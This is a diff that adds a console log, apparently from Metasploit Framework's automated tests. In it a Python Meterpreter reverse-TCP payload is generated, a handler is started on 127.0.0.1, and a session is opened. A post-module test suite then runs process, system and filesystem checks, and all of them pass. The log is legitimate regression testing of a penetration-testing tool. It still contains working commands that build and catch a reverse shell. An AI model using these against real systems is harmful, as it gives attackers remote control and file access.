@@ -1,0 +1,90 @@
+use python/meterpreter_reverse_tcp
+Stopping all jobs...
+[4mmsf6[0m post([1m[31mtest/search[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/tmp/pythonmeterpreter_reverse_tcp_session_tlv_logging20240307-2976-93oqjctxt
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> generate -o /tmp/child-process-rb-python-meterpreter-reverse-tcp20240307-2976-waa7n3.py -f raw AutoVerifySessionTimeout=30 lport=6006 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/pythonmeterpreter_reverse_tcp_debug_log20240307-2976-35340otxt MeterpreterTryToFork=false PythonMeterpreterDebug=true
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> SessionTlvLogging => file:/tmp/pythonmeterpreter_reverse_tcp_session_tlv_logging20240307-2976-93oqjctxt
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> [*] Writing 24916 bytes to /tmp/child-process-rb-python-meterpreter-reverse-tcp20240307-2976-waa7n3.py...
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> to_handler AutoVerifySessionTimeout=30 lport=6006 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/pythonmeterpreter_reverse_tcp_debug_log20240307-2976-35340otxt MeterpreterTryToFork=false PythonMeterpreterDebug=true
+[*] Payload Handler Started as Job 5
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6006 
+[*] Meterpreter session 6 opened (127.0.0.1:6006 -> 127.0.0.1:55090) at 2024-03-07 09:37:39 +0000
+use test/meterpreter
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> run session=6 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to tmp: /tmp
+[*] Setup: Creating clean directory
+[*] Creating directory meterpreter-test-dir-idypvtof
+[*] meterpreter-test-dir-idypvtof created
+[*] Setup: Now in /tmp/meterpreter-test-dir-idypvtof
+[*] Running against session 6
+[*] Session type is meterpreter and platform is linux
+[+] should enumerate supported core commands
+[+] should support 3 or more core commands
+[*] Starting process tests
+[*] [should return its own process id] Pid: 3142
+[+] should return its own process id
+[*] [should return a list of processes] PID info: {"pid"=>3142, "ppid"=>2976, "name"=>"python", "path"=>"python /tmp/child-process-rb-python-meterpreter-reverse-tcp20240307-2976-waa7n3.py ", "session"=>nil, "user"=>"runner", "arch"=>nil}
+[+] should return a list of processes
+[*] Starting system config tests
+[+] should return a user id
+[+] should return a sysinfo Hash
+[*] Starting networking tests
+[+] should return network interfaces
+[+] should have an interface that matches session_host
+[+] should return network routes
+[*] Starting filesystem tests
+[*] [should return the proper directory separator] received sysinfo {"Computer"=>"fv-az567-642", "OS"=>"Linux 5.15.0-1057-azure #65~20.04.1-Ubuntu SMP Mon Feb 12 17:26:40 UTC 2024", "Architecture"=>"x64", "BuildTuple"=>nil, "System Language"=>"C", "Domain"=>nil, "Logged On Users"=>nil}
+[*] [should return the proper directory separator] Received separator "/" - expected: "/"
+[+] should return the proper directory separator
+[*] [should return the current working directory] CWD: /tmp/meterpreter-test-dir-idypvtof
+[+] should return the current working directory
+[+] should list files in the current directory
+[*] [should stat a directory] Current directory: "/tmp/meterpreter-test-dir-idypvtof"
+[*] [should stat a directory] Stat of current directory: #<#<Class:0x0000563282bbfe80>:0x000056327fc04f60 @stathash={"st_dev"=>2065, "st_mode"=>16877, "st_nlink"=>2, "st_uid"=>1001, "st_gid"=>127, "st_rdev"=>0, "st_ino"=>96794, "st_size"=>4096, "st_atime"=>1709804259, "st_mtime"=>1709804259, "st_ctime"=>1709804259}>
+[+] should stat a directory
+[*] [should create and remove a dir] Directory Name: meterpreter-test-dir-jcbfxqgw
+[*] [should create and remove a dir] Directory created successfully
+[*] [should create and remove a dir] Directory removed successfully
+[+] should create and remove a dir
+[*] [should change directories] Directory Name: meterpreter-test-dir-jcbfxqgw
+[*] [should change directories] Directory created successfully
+[*] [should change directories] Old CWD: /tmp/meterpreter-test-dir-idypvtof
+[*] [should change directories] New CWD: /tmp/meterpreter-test-dir-idypvtof/meterpreter-test-dir-jcbfxqgw
+[*] [should change directories] Back to old CWD: /tmp/meterpreter-test-dir-idypvtof
+[*] [should change directories] Directory removed successfully
+[+] should change directories
+[*] [should create and remove files] File Name: meterpreter-test-jcbfxqgw
+[*] [should create and remove files] Wrote to meterpreter-test-jcbfxqgw, checking contents
+[*] [should create and remove files] Wrote test
+[+] should create and remove files
+[*] [should upload a file] Remote File Name: meterpreter-test-file-jcbfxqgw.txt
+[*] [should upload a file] uploading
+[*] [should upload a file] done
+[*] [should upload a file] remote file exists? true
+[+] should upload a file
+[*] [should move files] Source File Name: meterpreter-test-jcbfxqgw
+[*] [should move files] Destination File Name: meterpreter-test-jcbfxqgw-moved
+[+] should move files
+[*] [should copy files] Source File Name: meterpreter-test-jcbfxqgw
+[*] [should copy files] Destination File Name: meterpreter-test-jcbfxqgw-copied
+[+] should copy files
+[*] [should do md5 and sha1 of files] Remote File Name: meterpreter-test-file-jcbfxqgw.txt
+[*] [should do md5 and sha1 of files] uploading
+[*] [should do md5 and sha1 of files] done
+[*] [should do md5 and sha1 of files] remote file exists? true
+[*] [should do md5 and sha1 of files] remote md5: 4b9d87c1f495a5a176e18ee27f85279a
+[*] [should do md5 and sha1 of files] local md5 : 4b9d87c1f495a5a176e18ee27f85279a
+[*] [should do md5 and sha1 of files] remote sha: 5ea80bb04e521918b087c695eb6930ac25ee8a7d
+[*] [should do md5 and sha1 of files] local sha : 5ea80bb04e521918b087c695eb6930ac25ee8a7d
+[+] should do md5 and sha1 of files
+[*] Testing complete in 0.31 seconds
+[*] Passed: 20; Failed: 0; Skipped: 0
+[*] Cleanup: changing working directory back to /home/runner/work/metasploit-framework/metasploit-framework
+[*] Post module execution completed
+sessions -K
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 6 closed.
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> 
